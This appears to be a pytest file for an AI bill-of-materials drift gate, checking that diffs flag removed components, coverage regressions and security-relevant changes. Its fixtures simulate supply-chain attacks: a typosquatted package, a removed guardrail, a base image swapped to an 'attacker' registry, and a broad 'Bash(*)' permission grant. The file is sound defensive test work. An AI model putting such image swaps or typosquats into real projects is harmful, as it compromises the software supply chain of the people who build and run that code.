"""What the drift gate must flag, what it must not, and how it says which is which."""

from __future__ import annotations

import json
import shutil
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from click.testing import CliRunner

from nexus_symbiote.cli import main
from nexus_symbiote.core.aibom import AIBOM, DependencyEdge
from nexus_symbiote.core.enums import RiskSeverity, TrustTier
from nexus_symbiote.core.models import (
    NATIVE_SPEC_VERSION,
    A2AClientComponent,
    AgentComponent,
    CompletenessClaim,
    DataSourceComponent,
    GuardrailComponent,
    MCPServerComponent,
    MemoryStoreComponent,
    ModelComponent,
    RegistryEntryComponent,
    RiskAssessment,
    ToolComponent,
)
from nexus_symbiote.diff.differ import _NAMED_PROPERTIES, AIBOMDiffer
from nexus_symbiote.graph import INFERRED_AGENT_REF
from nexus_symbiote.scanners.shadowscan import ShadowScanImporter
from tests.test_model_integrity import onnx_model, onnx_tensor, write_safetensors

GUIDE = Path(__file__).resolve().parents[1] / "docs" / "drift-gate.md"
REPORT = Path(__file__).parent / "fixtures/shadowscan/code-report-0.1.4.json"
CYCLONEDX = Path(__file__).parent / "fixtures/shadowscan-producer/cyclonedx-agent-model.json"


def _scan(project: Path, output: Path, *extra: str) -> None:
    args = ["scan", str(project), "--no-project-policy", "--report-only", "-o", str(output)]
    result = CliRunner().invoke(main, [*args, *extra])
    assert result.exit_code == 0, result.output


def _gate(before: Path, after: Path) -> tuple[int, dict]:
    result = CliRunner().invoke(
        main, ["diff", str(before), str(after), "--json-output", "--fail-on-alert"]
    )
    return result.exit_code, json.loads(result.stdout)


def _alerts(report: dict) -> list[str]:
    return [alert["alert"] for alert in report["security_alerts"]]


@pytest.mark.parametrize(
    ("relative", "before", "after", "removed"),
    [
        (
            "requirements.txt",
            "openai==1.30.0\nlangchain==0.2.0\n",
            "open-ai==1.30.0\nlangchain==0.2.0\n",
            "registry:pypi/openai",
        ),
        (
            "requirements.txt",
            "guardrails-ai==0.5.0\nopenai==1.30.0\n",
            "openai==1.30.0\n",
            "registry:pypi/guardrails-ai",
        ),
        (
            "Dockerfile.agent",
            "FROM ollama/ollama@sha256:" + "a" * 64 + "\nFROM vllm/vllm-openai:v0.6.0\n",
            "FROM ghcr.io/attacker/serve:latest\nFROM vllm/vllm-openai:v0.6.0\n",
            "registry:docker/ollama/ollama@sha256:" + "a" * 64,
        ),
    ],
    ids=["typosquat-swap", "guardrail-removed", "base-image-swap"],
)
def test_removed_registry_entry_fails_the_drift_gate(tmp_path, relative, before, after, removed):
    project = tmp_path / "project"
    project.mkdir()
    (project / relative).write_text(before)
    _scan(project, tmp_path / "before.json")
    (project / relative).write_text(after)
    _scan(project, tmp_path / "after.json")
    status, report = _gate(tmp_path / "before.json", tmp_path / "after.json")
    assert status == 1, report
    gone = [c for c in report["components_removed"] if c["bom_ref"] == removed]
    assert gone and gone[0]["severity"] in {"medium", "high"}
    assert any(
        alert["component"] == removed and "no longer in the inventory" in alert["alert"]
        for alert in report["security_alerts"]
    )


def test_removed_tool_with_dangling_reference_fails_the_gate_in_a_supplied_bom(tmp_path):
    agent = AgentComponent(bom_ref="agent:a", name="a", tool_refs=["tool:t"])
    tool = ToolComponent(bom_ref="tool:t", name="t", definition_hash="sha256:" + "a" * 64)
    before, after = tmp_path / "v1.json", tmp_path / "v2.json"
    AIBOM(components=[agent, tool]).save(before)
    AIBOM(components=[agent]).save(after)
    status, report = _gate(before, after)
    assert status == 1
    assert report["components_removed"][0]["severity"] == "high"
    assert any("graph consistency" in alert for alert in _alerts(report))


@pytest.mark.parametrize(
    ("component", "severity"),
    [
        (MCPServerComponent(bom_ref="x", name="x"), "high"),
        (ToolComponent(bom_ref="x", name="x"), "high"),
        (ModelComponent(bom_ref="x", name="x"), "high"),
        (GuardrailComponent(bom_ref="x", name="x"), "high"),
        (A2AClientComponent(bom_ref="x", name="x"), "high"),
        (RegistryEntryComponent(bom_ref="x", name="x"), "medium"),
        (RegistryEntryComponent(bom_ref="x", name="x", package_url="pkg:pypi/x@1.0.0"), "high"),
        (MemoryStoreComponent(bom_ref="x", name="x"), "medium"),
        (DataSourceComponent(bom_ref="x", name="x", content_hash="sha256:" + "b" * 64), "high"),
    ],
)
def test_removal_rating_follows_type_and_integrity_evidence(component, severity):
    report = AIBOMDiffer().diff(AIBOM(components=[component]), AIBOM())
    assert report.components_removed[0].severity == severity
    assert report.security_alerts == [
        {
            "severity": severity,
            "component": "x",
            "alert": f"Component 'x' ({component.component_type.value}) is no longer in the "
            "inventory: confirm it was deleted, not moved out of collector scope.",
        }
    ]


def _project(root: Path) -> None:
    (root / "src").mkdir(parents=True)
    (root / "CLAUDE.md").write_text("Use read-only tools.\n")
    (root / "requirements.txt").write_text("openai==1.30.0\n")
    (root / "src/app.py").write_text("print('hello')\n")


def test_an_unrelated_source_file_is_not_drift(tmp_path):
    project = tmp_path / "project"
    _project(project)
    _scan(project, tmp_path / "before.json")
    (project / "src/helpers.py").write_text("def helper():\n    return 1\n")
    (project / "tests").mkdir()
    (project / "tests/test_helpers.py").write_text("def test_helper():\n    pass\n")
    _scan(project, tmp_path / "after.json")
    status, report = _gate(tmp_path / "before.json", tmp_path / "after.json")
    assert status == 0, report["security_alerts"]
    assert report["security_alerts"] == []
    assert all(change["severity"] == "info" for change in report["metadata_changes"])


def test_the_same_tree_in_another_directory_keeps_its_repository_agent(tmp_path):
    first, second = tmp_path / "one" / "checkout", tmp_path / "two" / "elsewhere"
    _project(first)
    shutil.copytree(first, second)
    _scan(first, tmp_path / "first.json")
    _scan(second, tmp_path / "second.json")
    scanned = [
        json.loads((tmp_path / name).read_text())["components"]
        for name in ("first.json", "second.json")
    ]
    refs = [
        {(c["bom_ref"], c["name"]) for c in found if c["component_type"] == "agent"}
        for found in scanned
    ]
    assert refs[0] == refs[1] == {(INFERRED_AGENT_REF, "repository")}


def _baseline(project: Path, output: Path, *extra: str):
    return CliRunner().invoke(main, ["baseline", str(project), "-o", str(output), *extra])


def test_a_baseline_can_ignore_the_checkout_policy_like_the_candidate_scan(tmp_path):
    project = tmp_path / "project"
    _project(project)
    (project / ".nexus-symbiote.yaml").write_text("scan: {exclude_paths: [vendor]}\n")
    assert _baseline(project, tmp_path / "operator.json", "--no-project-policy").exit_code == 0
    assert _baseline(project, tmp_path / "checkout.json", "--accept-project-policy").exit_code == 0
    _scan(project, tmp_path / "candidate.json")
    exclusions = {
        name: json.loads((tmp_path / f"{name}.json").read_text())["metadata"]["completeness"][
            "exclusions"
        ]
        for name in ("operator", "checkout", "candidate")
    }
    assert exclusions["operator"] == exclusions["candidate"]
    assert "vendor" in exclusions["checkout"] and "vendor" not in exclusions["operator"]
    assert _gate(tmp_path / "operator.json", tmp_path / "candidate.json")[0] == 0


def test_a_baseline_applies_the_operator_signature_policy(tmp_path):
    project = tmp_path / "project"
    _project(project)
    policy = tmp_path / "signers.json"
    policy.write_text('{"version": 1, "artifacts": []}')
    refused = _baseline(project, tmp_path / "reviewed.json", "--signature-policy", str(policy))
    # The scan rejects the policy (exit 1); an unknown option would be a usage error (2).
    assert refused.exit_code == 1, refused.output
    assert not (tmp_path / "reviewed.json").exists()
    assert _baseline(project, tmp_path / "reviewed.json").exit_code == 0


def _claim(**fields) -> CompletenessClaim:
    base = {
        "scope": "repository",
        "scanner_status": {"mcp": "complete", "model": "complete"},
        "collectors_requested": ["mcp", "model"],
        "collectors_completed": ["mcp", "model"],
        "surfaces_scanned": ["a.json"],
    }
    return CompletenessClaim(**{**base, **fields})


def _compare(old: CompletenessClaim | None, new: CompletenessClaim | None):
    before, after = AIBOM(), AIBOM()
    before.metadata.completeness, after.metadata.completeness = old, new
    return AIBOMDiffer().diff(before, after)


@pytest.mark.parametrize(
    ("change", "field", "text"),
    [
        ({"scan_failures": ["mcp.json: invalid JSON"]}, "scan_failures", "mcp.json: invalid JSON"),
        ({"surfaces_excluded": ["models: excluded"]}, "surfaces_excluded", "models: excluded"),
        ({"exclusions": ["vendor"]}, "exclusions", "vendor"),
        (
            {"scanner_status": {"mcp": "partial", "model": "complete"}},
            "scanner_status.mcp",
            "'mcp' coverage changed from complete to partial",
        ),
        ({"scanner_status": {"mcp": "complete"}}, "scanner_status.model", "'model' is no longer"),
        ({"collectors_requested": ["mcp"]}, "collectors_requested", "model"),
        ({"collectors_completed": ["mcp"]}, "collectors_completed", "model"),
        ({"scope": "repository+shadowscan"}, "scope", "repository+shadowscan"),
        ({"unobserved_surfaces": ["network"]}, "unobserved_surfaces", "network"),
    ],
)
def test_each_coverage_regression_alerts_high_and_names_itself(change, field, text):
    report = _compare(_claim(), _claim(**change))
    alerts = [a for a in report.security_alerts if a["component"] == "metadata"]
    assert len(alerts) == 1 and alerts[0]["severity"] == "high"
    assert text in alerts[0]["alert"]
    assert report.metadata_changes[0]["field"] == f"completeness.{field}"
    reverse = _compare(_claim(**change), _claim())
    if field == "scope":
        # A different scope is a different claim, so it alerts in either direction.
        assert [a["severity"] for a in reverse.security_alerts] == ["high"]
        return
    # The reverse direction is an improvement: recorded, never an alert.
    assert reverse.security_alerts == []
    assert reverse.has_changes and {c["severity"] for c in reverse.metadata_changes} == {"info"}


def test_a_second_identical_gap_is_a_new_gap():
    failure = "requirements.txt: URL, VCS or path requirement not followed"
    report = _compare(_claim(scan_failures=[failure]), _claim(scan_failures=[failure, failure]))
    assert [a["severity"] for a in report.security_alerts] == ["high"]


def test_scanned_surfaces_added_alone_are_an_info_note():
    report = _compare(_claim(), _claim(surfaces_scanned=["a.json", "src/new.py"]))
    assert report.security_alerts == []
    assert report.metadata_changes == [
        {
            "field": "completeness.surfaces_scanned",
            "severity": "info",
            "detail": "1 scanned surface added (src/new.py). "
            "Components found there are compared separately.",
        }
    ]


def test_removed_scanned_surface_alerts_as_narrowed_coverage():
    report = _compare(_claim(surfaces_scanned=["a.json", "src/old.py"]), _claim())
    assert [(a["severity"], a["component"]) for a in report.security_alerts] == [
        ("high", "metadata")
    ]
    assert "src/old.py" in report.security_alerts[0]["alert"]
    assert "coverage narrowed" in report.security_alerts[0]["alert"]
    assert report.metadata_changes[0]["field"] == "completeness.surfaces_scanned"


def test_collector_newly_recorded_as_failed_alerts():
    noted = _compare(
        _claim(scanner_status={"mcp": "complete"}),
        _claim(scanner_status={"mcp": "complete", "model": "failed"}),
    )
    assert [a["severity"] for a in noted.security_alerts] == ["high"]
    assert "'model'" in noted.security_alerts[0]["alert"]
    assert "does not show this gap predates the change" in noted.security_alerts[0]["alert"]
    complete = _compare(
        _claim(scanner_status={"mcp": "complete"}),
        _claim(scanner_status={"mcp": "complete", "model": "complete"}),
    )
    assert complete.security_alerts == []
    assert {c["severity"] for c in complete.metadata_changes} == {"info"}


def test_the_guide_rates_and_quotes_each_fail_closed_alert():
    """docs/drift-gate.md rates each alert this gate newly raises and quotes its reason."""
    guide = GUIDE.read_text(encoding="utf-8")
    table = guide.split("\n## What the alerts mean\n", 1)[1].split("\n## ", 1)[0]

    def rating(reason: str) -> str:
        row = next(line for line in table.splitlines() if f"`{reason}`" in line)
        return row.rstrip().rstrip("|").rsplit("|", 1)[1].strip()

    surface = _compare(_claim(surfaces_scanned=["a.json", "src/old.py"]), _claim())
    collector = _compare(
        _claim(scanner_status={"mcp": "complete"}),
        _claim(scanner_status={"mcp": "complete", "model": "failed"}),
    )
    for report in (surface, collector):
        (alert,) = report.security_alerts
        assert alert["severity"] == "high"
        assert rating(alert["alert"]).startswith("high")

    digest = "sha256:" + "a" * 64
    unpinned = [
        ToolComponent(bom_ref="tool:t", name="t"),
        DataSourceComponent(bom_ref="data:d", name="d"),
        ModelComponent(bom_ref="model:m", name="m"),
    ]
    pinned = [
        ToolComponent(bom_ref="tool:t", name="t", definition_hash=digest),
        DataSourceComponent(bom_ref="data:d", name="d", content_hash=digest),
        ModelComponent(bom_ref="model:m", name="m", hashes={"sha256": digest}),
    ]
    bound = AIBOMDiffer().diff(AIBOM(components=unpinned), AIBOM(components=pinned))
    assert [alert["severity"] for alert in bound.security_alerts] == ["medium"] * 3
    for change in bound.components_modified:
        (reason,) = change.details
        assert "became available" in reason
        assert rating(reason).startswith("medium")

    assert "a changed list of scanned surfaces" not in guide


def test_shared_gaps_are_noted_without_counting_as_change(tmp_path):
    claim = _claim(
        scanner_status={"mcp": "partial", "model": "complete"},
        surfaces_excluded=["mcp.json: unsupported declaration"],
    )
    report = _compare(claim, claim.model_copy(deep=True))
    assert not report.has_changes and report.security_alerts == []
    assert len(report.notes) == 1
    assert "Both snapshots are incomplete" in report.notes[0]["detail"]
    assert "mcp (partial)" in report.notes[0]["detail"]
    bom = AIBOM()
    bom.metadata.completeness = claim
    bom.save(tmp_path / "bom.json")
    text = CliRunner().invoke(
        main, ["diff", str(tmp_path / "bom.json"), str(tmp_path / "bom.json")]
    )
    assert text.exit_code == 0
    assert "No changes detected." in text.output
    assert "Both snapshots are incomplete" in text.output


def test_missing_completeness_claims_are_never_silently_equal():
    assert (
        "Neither snapshot carries a completeness claim" in _compare(None, None).notes[0]["detail"]
    )
    dropped = _compare(_claim(), None)
    assert [a["severity"] for a in dropped.security_alerts] == ["high"]


@pytest.mark.parametrize(
    ("gap", "named"),
    [
        ({"scan_failures": ["mcp.json: invalid JSON"]}, "mcp.json: invalid JSON"),
        ({"surfaces_excluded": ["models: excluded"]}, "models: excluded"),
        ({"scanner_status": {"mcp": "partial", "model": "complete"}}, "mcp (partial)"),
        ({"collectors_completed": ["mcp"]}, "model (not completed)"),
        ({"source_report_status": "incomplete"}, "ShadowScan source status: incomplete"),
        ({"source_unmapped_count": 3}, "ShadowScan entries left unmapped: 3"),
        (
            {"scanner_status": {}, "collectors_requested": [], "collectors_completed": []},
            "No collector is recorded",
        ),
    ],
)
def test_a_baseline_without_a_claim_cannot_hide_gaps_in_the_new_snapshot(gap, named):
    report = _compare(None, _claim(**gap))
    assert [(a["severity"], a["component"]) for a in report.security_alerts] == [
        ("high", "metadata")
    ]
    assert "cannot be shown to predate this change" in report.security_alerts[0]["alert"]
    assert named in report.security_alerts[0]["alert"]
    assert [c["field"] for c in report.metadata_changes] == ["completeness.claim"]


def test_a_baseline_without_a_claim_against_complete_coverage_is_a_note():
    report = _compare(None, _claim())
    assert report.security_alerts == []
    assert [(c["field"], c["severity"]) for c in report.metadata_changes] == [
        ("completeness.claim", "info")
    ]


def test_a_supplied_baseline_without_a_claim_still_gates_a_failed_collector(tmp_path):
    project = tmp_path / "project"
    project.mkdir()
    (project / "CLAUDE.md").write_text("Use read-only tools.\n")
    _scan(project, tmp_path / "clean.json")
    supplied = json.loads((tmp_path / "clean.json").read_text())
    supplied["metadata"].pop("completeness")
    (tmp_path / "supplied.json").write_text(json.dumps(supplied))
    assert _gate(tmp_path / "supplied.json", tmp_path / "clean.json")[0] == 0
    # A malformed configuration hides whatever it declares without removing a component.
    (project / ".mcp.json").write_text('{"mcpServers": {')
    _scan(project, tmp_path / "broken.json")
    status, report = _gate(tmp_path / "supplied.json", tmp_path / "broken.json")
    assert status == 1
    (alert,) = _alerts(report)
    assert "no completeness claim" in alert and "invalid JSON" in alert


def test_a_different_producer_is_not_a_release_note():
    old, new = AIBOM(), AIBOM()
    new.metadata.tool_name, new.metadata.tool_vendor = "other-generator", "someone-else"
    report = AIBOMDiffer().diff(old, new)
    assert sorted((a["severity"], a["alert"]) for a in report.security_alerts) == [
        ("medium", "Snapshot metadata tool_name changed."),
        ("medium", "Snapshot metadata tool_vendor changed."),
    ]
    assert all("releases" not in c["detail"] for c in report.metadata_changes)


def test_shadowscan_content_change_and_coverage_regression_read_differently():
    digest = "sha256:" + "1" * 64
    common = {
        "source_report_digest": digest,
        "source_report_content_digest": "sha256:" + "2" * 64,
        "source_report_content_profile": "nexus-symbiote/shadowscan-content/v1",
    }
    content = _compare(
        _claim(**common),
        _claim(
            **{
                **common,
                "source_report_digest": "sha256:" + "3" * 64,
                "source_report_content_digest": "sha256:" + "4" * 64,
            }
        ),
    )
    failed = _compare(_claim(**common), _claim(**common, scanner_status={"mcp": "failed"}))
    assert [a["alert"] for a in content.security_alerts] == [
        "ShadowScan report content changed; review the report and the imported components."
    ]
    assert all("ShadowScan" not in a["alert"] for a in failed.security_alerts)
    unmapped = _compare(_claim(**common), _claim(**common, source_unmapped_count=2))
    assert "unmapped rose from 0 to 2" in unmapped.security_alerts[0]["alert"]


REPORT_DIGEST = "sha256:" + "1" * 64
COMPARABLE_CONTENT = {
    "source_report_digest": REPORT_DIGEST,
    "source_report_content_digest": "sha256:" + "2" * 64,
    "source_report_content_profile": "nexus-symbiote/shadowscan-content/v1",
}


@pytest.mark.parametrize(
    ("before", "after", "field", "alert"),
    [
        (
            {"assurance_level": "observed"},
            {},
            "assurance_level",
            "Coverage assurance changed from observed to declared.",
        ),
        (
            {"source_report_format": "shadowscan-json"},
            {"source_report_format": "shadowscan-cyclonedx"},
            "source_report_format",
            "ShadowScan report format changed from shadowscan-json to shadowscan-cyclonedx.",
        ),
        (
            {"source_report_status": "complete"},
            {"source_report_status": "incomplete"},
            "source_report_status",
            "ShadowScan source status changed from complete to incomplete.",
        ),
        (
            {"source_report_status": "incomplete"},
            {"source_report_status": "unknown"},
            "source_report_status",
            "ShadowScan source status changed from incomplete to unknown.",
        ),
        (
            {"source_projection_limitations": []},
            {"source_projection_limitations": ["tool schemas not projected"]},
            "source_projection_limitations",
            "New ShadowScan projection limitations: tool schemas not projected.",
        ),
        (
            COMPARABLE_CONTENT,
            {**COMPARABLE_CONTENT, "source_unmapped_count": 2, "source_unmapped_indexes": [0, 4]},
            "source_unmapped_count",
            "ShadowScan entries left unmapped rose from 0 to 2.",
        ),
    ],
)
def test_each_imported_evidence_regression_alerts_and_its_reverse_is_a_note(
    before, after, field, alert
):
    report = _compare(_claim(**before), _claim(**after))
    assert [(a["severity"], a["alert"]) for a in report.security_alerts] == [("high", alert)]
    assert [c["field"] for c in report.metadata_changes] == [f"completeness.{field}"]
    reverse = _compare(_claim(**after), _claim(**before))
    assert reverse.security_alerts == []
    assert [(c["field"], c["severity"]) for c in reverse.metadata_changes] == [
        (f"completeness.{field}", "info")
    ]


@pytest.mark.parametrize(
    ("before", "after", "alert"),
    [
        (
            {"source_report_digest": REPORT_DIGEST},
            {},
            "The ShadowScan report is no longer imported.",
        ),
        ({}, {"source_report_digest": REPORT_DIGEST}, "A ShadowScan report is now imported."),
        (
            {"source_report_digest": REPORT_DIGEST},
            {"source_report_digest": "sha256:" + "3" * 64},
            "ShadowScan report bytes changed, and the snapshots carry no comparable content digest.",
        ),
    ],
)
def test_a_report_imported_dropped_or_changed_without_content_digests_alerts(before, after, alert):
    report = _compare(_claim(**before), _claim(**after))
    assert [(a["severity"], a["alert"]) for a in report.security_alerts] == [("high", alert)]


def test_a_regenerated_report_and_moved_unmapped_entries_are_notes():
    regenerated = _compare(
        _claim(**COMPARABLE_CONTENT),
        _claim(**{**COMPARABLE_CONTENT, "source_report_digest": "sha256:" + "3" * 64}),
    )
    moved = _compare(
        _claim(**COMPARABLE_CONTENT, source_unmapped_count=1, source_unmapped_indexes=[0]),
        _claim(**COMPARABLE_CONTENT, source_unmapped_count=1, source_unmapped_indexes=[3]),
    )
    for report, field, detail in (
        (
            regenerated,
            "source_report_digest",
            "ShadowScan report regenerated; normalized content unchanged.",
        ),
        (
            moved,
            "source_unmapped_indexes",
            "Unmapped ShadowScan entries moved within the report; their number is unchanged.",
        ),
    ):
        assert report.security_alerts == []
        assert report.metadata_changes == [
            {"field": f"completeness.{field}", "severity": "info", "detail": detail}
        ]


def test_relationship_between_existing_components_is_rated_and_printed(tmp_path):
    agent = AgentComponent(bom_ref="agent:a", name="a")
    tool = ToolComponent(bom_ref="tool:t", name="t")
    guard = GuardrailComponent(bom_ref="guard:g", name="g")
    guarded = DependencyEdge(
        source_ref="agent:a", target_ref="guard:g", relationship="uses-guardrail"
    )
    before = AIBOM(components=[agent, tool, guard], dependencies=[guarded])
    after = AIBOM(
        components=[agent, tool, guard],
        dependencies=[
            DependencyEdge(source_ref="agent:a", target_ref="tool:t", relationship="invokes")
        ],
    )
    report = AIBOMDiffer().diff(before, after)
    assert [(d.relationship, d.severity) for d in report.dependencies_added] == [
        ("invokes", "high")
    ]
    assert [(d.relationship, d.severity) for d in report.dependencies_removed] == [
        ("uses-guardrail", "high")
    ]
    assert [a["alert"] for a in report.security_alerts] == [
        "Relationship added: 'agent:a' invokes 'tool:t'.",
        "Relationship removed: 'agent:a' uses-guardrail 'guard:g'.",
    ]
    before.save(tmp_path / "before.json")
    after.save(tmp_path / "after.json")
    args = ["diff", str(tmp_path / "before.json"), str(tmp_path / "after.json")]
    text = CliRunner().invoke(main, [*args, "--fail-on-alert"])
    assert text.exit_code == 1
    assert "+1 relationships added" in text.output
    assert "+ [HIGH] agent:a invokes tool:t" in text.output
    assert "- [HIGH] agent:a uses-guardrail guard:g" in text.output


def test_an_edge_to_a_new_component_is_listed_but_alerts_once_through_the_component():
    agent = AgentComponent(bom_ref="agent:a", name="a")
    server = MCPServerComponent(bom_ref="server:s", name="s")
    edge = DependencyEdge(
        source_ref="agent:a", target_ref="server:s", relationship="configured-with"
    )
    report = AIBOMDiffer().diff(
        AIBOM(components=[agent]), AIBOM(components=[agent, server], dependencies=[edge])
    )
    assert len(report.dependencies_added) == 1
    assert [a["component"] for a in report.security_alerts] == ["server:s"]


def test_changed_edge_conditions_alert_once():
    agent = AgentComponent(bom_ref="agent:a", name="a")
    tool = ToolComponent(bom_ref="tool:t", name="t")
    edge = DependencyEdge(
        source_ref="agent:a", target_ref="tool:t", relationship="invokes", conditions="approved"
    )
    report = AIBOMDiffer().diff(
        AIBOM(components=[agent, tool], dependencies=[edge]),
        AIBOM(
            components=[agent, tool], dependencies=[edge.model_copy(update={"conditions": None})]
        ),
    )
    assert [a["severity"] for a in report.security_alerts] == ["high"]
    assert "assurance or conditions changed" in report.security_alerts[0]["alert"]


@pytest.mark.parametrize(
    ("old", "new", "severity", "detail"),
    [
        (
            MCPServerComponent(bom_ref="x", name="x", trust_tier=TrustTier.UNTRUSTED_PUBLIC),
            MCPServerComponent(bom_ref="x", name="x", trust_tier=TrustTier.INTERNAL_VERIFIED),
            "medium",
            "Trust tier upgraded",
        ),
        (
            ModelComponent(bom_ref="x", name="x", signing_status="signature-not-found"),
            ModelComponent(bom_ref="x", name="x", signing_status="sigstore-signed"),
            "medium",
            "Signing status changed",
        ),
        (
            ModelComponent(bom_ref="x", name="x", signing_status="digest-pinned"),
            ModelComponent(bom_ref="x", name="x", signing_status="signature-not-found"),
            "high",
            "Signing status changed",
        ),
        (
            A2AClientComponent(bom_ref="x", name="x", agent_card_url="https://a.example"),
            A2AClientComponent(bom_ref="x", name="x", agent_card_url="https://b.example"),
            "high",
            "agent_card_url changed.",
        ),
        (
            ModelComponent(bom_ref="x", name="x", provider="one"),
            ModelComponent(bom_ref="x", name="x", provider="two"),
            "high",
            "provider changed.",
        ),
        (
            DataSourceComponent(bom_ref="x", name="x", source_uri="https://a.example/d"),
            DataSourceComponent(bom_ref="x", name="x", source_uri="https://b.example/d"),
            "high",
            "source_uri changed.",
        ),
        (
            RegistryEntryComponent(bom_ref="x", name="x", signing_key_reference="k1"),
            RegistryEntryComponent(bom_ref="x", name="x", signing_key_reference="k2"),
            "high",
            "signing_key_reference changed.",
        ),
        (
            AgentComponent(bom_ref="x", name="x", properties={"declared_autonomy_level": "L1"}),
            AgentComponent(bom_ref="x", name="x", properties={"declared_autonomy_level": "L4"}),
            "high",
            "Declared autonomy level changed.",
        ),
        (
            ToolComponent(bom_ref="x", name="x", annotations={"readOnlyHint": 1}),
            ToolComponent(bom_ref="x", name="x", annotations={"readOnlyHint": True}),
            "critical",
            "annotations changed.",
        ),
    ],
)
def test_security_relevant_transitions_are_rated_like_their_peers(old, new, severity, detail):
    report = AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new]))
    assert report.components_modified[0].severity == severity
    assert any(detail in d for d in report.components_modified[0].details)


def test_risk_changes_carry_the_severity_of_what_was_added():
    finding = RiskAssessment(severity=RiskSeverity.LOW, category="note", detail="minor")
    critical = RiskAssessment(severity=RiskSeverity.CRITICAL, category="unsafe", detail="loader")
    model = ModelComponent(bom_ref="m", name="m", risks=[finding])
    added = AIBOMDiffer().diff(
        AIBOM(components=[model]),
        AIBOM(components=[model.model_copy(update={"risks": [finding, critical]})]),
    )
    assert added.components_modified[0].severity == "critical"
    assert added.components_modified[0].details == ["Risk findings added: 1 critical (unsafe)."]
    removed = AIBOMDiffer().diff(
        AIBOM(components=[model]), AIBOM(components=[model.model_copy(update={"risks": []})])
    )
    assert removed.components_modified[0].details == ["Risk findings removed: 1 low (note)."]
    assert removed.components_modified[0].severity == "medium"


def test_a_tool_upgrade_is_a_note_not_an_alert():
    old, new = AIBOM(), AIBOM()
    old.metadata.tool_version, new.metadata.tool_version = "0.1.0", "0.2.0"
    report = AIBOMDiffer().diff(old, new)
    assert report.security_alerts == []
    assert [c["field"] for c in report.metadata_changes] == ["tool_version"]


def test_unsupported_spec_version_and_reversed_arguments_are_reported():
    old, new = AIBOM(), AIBOM()
    new.metadata.spec_version = "9.0.0"
    old.metadata.timestamp = datetime.now(UTC)
    new.metadata.timestamp = old.metadata.timestamp - timedelta(days=1)
    report = AIBOMDiffer().diff(old, new)
    assert any(
        "spec_version this release does not support" in a["alert"] for a in report.security_alerts
    )
    assert any("check the argument order" in note["detail"] for note in report.notes)


@pytest.mark.parametrize("version", ["1.0.0", "1.0.7", NATIVE_SPEC_VERSION])
def test_the_differ_supports_every_format_version_the_reader_accepts(version):
    old, new = AIBOM(), AIBOM()
    old.metadata.spec_version = version
    report = AIBOMDiffer().diff(old, new)
    assert not any("does not support" in a["alert"] for a in report.security_alerts)
    new.metadata.spec_version = "1.9.0"
    report = AIBOMDiffer().diff(old, new)
    assert any("does not support" in a["alert"] for a in report.security_alerts)


def test_legacy_absolute_paths_are_explained():
    old = AIBOM(components=[ModelComponent(bom_ref="m", name="m", source_path="/home/a/m.bin")])
    new = AIBOM(components=[ModelComponent(bom_ref="m", name="m", source_path="m.bin")])
    report = AIBOMDiffer().diff(old, new)
    assert any(note["field"] == "paths" for note in report.notes)
    assert report.components_modified, "a location change is still reported"


def _with_finding_first(data: dict) -> dict:
    data = json.loads(json.dumps(data))
    extra = json.loads(json.dumps(data["findings"][1]))
    extra["id"] = "ss-inserted-first"
    data["findings"].insert(0, extra)
    data["summary"]["total"] += 1
    data["summary"]["by_kind"][extra["kind"]] += 1
    data["summary"]["by_surface"][extra["surface"]] += 1
    data["summary"]["by_risk_level"][extra["risk"]["level"]] += 1
    return data


def test_an_inserted_finding_alerts_only_for_itself():
    before = ShadowScanImporter().parse_report(REPORT.read_bytes()).to_native_bom()
    after = (
        ShadowScanImporter()
        .parse_report(json.dumps(_with_finding_first(json.loads(REPORT.read_text()))))
        .to_native_bom()
    )
    report = AIBOMDiffer().diff(before, after)
    assert not report.components_modified
    assert len(report.components_added) == 1
    components = {a["component"] for a in report.security_alerts} - {"metadata"}
    assert components == {report.components_added[0].bom_ref}


def test_reordered_cyclonedx_dependencies_are_not_a_changed_relationship():
    data = json.loads(CYCLONEDX.read_text())
    data["dependencies"].insert(0, {"ref": "unmapped-source", "dependsOn": []})
    before = ShadowScanImporter().parse_report(CYCLONEDX.read_bytes()).to_native_bom()
    after = ShadowScanImporter().parse_report(json.dumps(data)).to_native_bom()
    assert before.dependencies[0].conditions != after.dependencies[0].conditions
    report = AIBOMDiffer().diff(before, after)
    assert not report.dependencies_added and not report.dependencies_removed


def _mutations(value):
    """Changes and removals of recorded values; adding evidence where there was none is not drift."""
    if isinstance(value, bool):
        yield not value
    elif isinstance(value, int):
        yield value + 1
    elif isinstance(value, str):
        yield value + "-changed"
    elif isinstance(value, list) and value:
        yield value[:-1]
    elif isinstance(value, dict) and value:
        dropped = sorted(value)[0]
        yield {key: item for key, item in value.items() if key != dropped}


def test_every_single_field_change_of_a_scanned_inventory_alerts(tmp_path):
    from pydantic import ValidationError

    project = tmp_path / "project"
    (project / ".claude").mkdir(parents=True)
    (project / "CLAUDE.md").write_text("Use read-only tools.\n")
    (project / "requirements.txt").write_text("openai==1.30.0\nlangchain\n")
    (project / ".claude/settings.json").write_text(
        json.dumps({"permissions": {"defaultMode": "default", "allow": ["Bash(*)"]}})
    )
    (project / ".mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "files": {
                        "command": "npx",
                        "args": ["-y", "@scope/files-mcp@1.0.0"],
                        "tools": [{"name": "read", "description": "Read", "inputSchema": {}}],
                    },
                    "remote": {"url": "https://mcp.example.com/mcp"},
                }
            }
        )
    )
    _scan(project, tmp_path / "bom.json")
    bom = AIBOM.load(tmp_path / "bom.json")
    checked = 0
    for index, component in enumerate(bom.components):
        original = component.model_dump(mode="json")
        for name, value in original.items():
            if name in {"bom_ref", "component_type"}:
                continue
            for mutated in _mutations(value):
                try:
                    candidate = type(component).model_validate({**original, name: mutated})
                except ValidationError:
                    continue
                if candidate.model_dump(mode="json") == original:
                    continue
                changed = bom.model_copy(deep=True)
                changed.components[index] = candidate
                report = AIBOMDiffer().diff(bom, changed)
                assert any(
                    alert["component"] == component.bom_ref
                    and alert["severity"] in {"medium", "high", "critical"}
                    for alert in report.security_alerts
                ), (component.bom_ref, name, report.to_dict())
                checked += 1
    assert checked > 50


def _digest_bound(root: Path, swapped: str | None = None) -> None:
    """Files recorded only as digests in a record's properties; `swapped` replaces one."""

    def write(relative: str, data: str | bytes) -> None:
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data.encode() if isinstance(data, str) else data)

    def weights(name: str) -> str:
        return "backdoored weights" if swapped == name else "reviewed weights"

    write("models/tf/saved_model.pb", b"\x08\x01")
